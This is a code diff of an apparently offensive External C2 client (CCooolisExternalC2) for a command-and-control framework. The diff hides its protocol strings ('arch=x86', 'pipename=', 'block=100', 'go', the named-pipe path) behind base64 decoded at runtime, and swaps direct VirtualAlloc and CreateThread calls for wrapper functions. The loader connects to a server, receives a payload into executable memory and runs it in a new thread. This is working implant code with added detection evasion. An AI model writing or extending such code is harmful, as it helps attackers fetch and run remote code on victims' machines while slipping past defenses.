@@ -95,21 +95,27 @@ BOOL CCooolisExternalC2::ConnectServer(std::string host, USHORT port)
 
 BOOL CCooolisExternalC2::SendOptions()
 {
-    std::string pipename = "pipename=";
+    std::string pipename = CooolisString("cGlwZW5hbWU9");
     sPipeName = this->GetPipeName();
     pipename.append(sPipeName);
-    
-    send_frame(socket_extc2, "arch=x86", 8);
-    send_frame(socket_extc2, (PCHAR)pipename.c_str(), pipename.length());
-    send_frame(socket_extc2, "block=100", 9);
-    send_frame(socket_extc2, "go", 2);
+    std::string block = CooolisString("YmxvY2s9MTAw");
+    std::string go = CooolisString("Z28=");
+#ifdef _WIN64
+    std::string arch = CooolisString("YXJjaD14NjQ=");
+#else
+    std::string arch = CooolisString("YXJjaD14ODY=");
+#endif
+    send_frame(socket_extc2, arch.data(), 8);
+    send_frame(socket_extc2, pipename.data(), pipename.length());
+    send_frame(socket_extc2, block.data(), 9);
+    send_frame(socket_extc2, go.data(), 2);
 
     return TRUE;
 }
 
 BOOL CCooolisExternalC2::RecvPayload()
 {
-    payload = (PCHAR)VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    payload = (PCHAR)CooolisVirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ZeroMemory(payload, PAYLOAD_MAX_SIZE);
     recv_frame(socket_extc2, payload, PAYLOAD_MAX_SIZE);
 
@@ -119,10 +125,10 @@ BOOL CCooolisExternalC2::RecvPayload()
 VOID CCooolisExternalC2::HandleBeacon()
 {
    
-    sPipeName.insert(0, "\\\\.\\pipe\\");
+    sPipeName.insert(0, CooolisString("XFwuXHBpcGVc"));
     this->hBeacon = INVALID_HANDLE_VALUE;
     
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);
+    CooolisCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);
 
     
     while (hBeacon == INVALID_HANDLE_VALUE) {
